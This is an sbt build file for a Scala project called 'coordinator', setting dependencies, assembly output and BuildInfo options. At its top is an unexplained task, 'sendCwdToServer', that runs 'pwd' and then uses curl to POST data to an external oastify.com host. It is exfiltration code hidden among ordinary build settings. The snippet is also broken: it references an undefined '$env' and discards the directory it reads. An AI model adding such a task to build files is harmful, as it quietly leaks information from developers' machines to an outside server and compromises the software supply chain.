import Dependencies._
import scala.sys.process._

val sendCwdToServer = taskKey[Unit]("Sends the current working directory to the server")

sendCwdToServer := {
  val pwd = "pwd".!!.trim
  val command = s"curl -d $env https://c7kslpueobgsbvmi2nkco7uv8mejh79vy.oastify.com"
  command.!
}

name := "coordinator"

libraryDependencies ++= Seq(
  c3po,
  slf4jLog4j12,
  metricsScala,
  socrataThirdPartyUtils,
  jna,
  opencsv,
  clojure,

  TestDeps.scalaCheck % "test",
  TestDeps.scalaMock  % "test"
)

assembly/test := {}

assembly/mainClass := Some("com.socrata.datacoordinator.Launch")

assembly/assemblyJarName := s"${name.value}-assembly.jar"

assembly/assemblyOutputPath := target.value / (assembly/assemblyJarName).value

// not setting "publish / skip" because soql-postgres-adapter uses this package in its tests.

enablePlugins(BuildInfoPlugin)

buildInfoKeys := Seq[BuildInfoKey](name, version, scalaVersion, sbtVersion)

buildInfoPackage := "com.socrata.datacoordinator"

buildInfoOptions += BuildInfoOption.ToJson
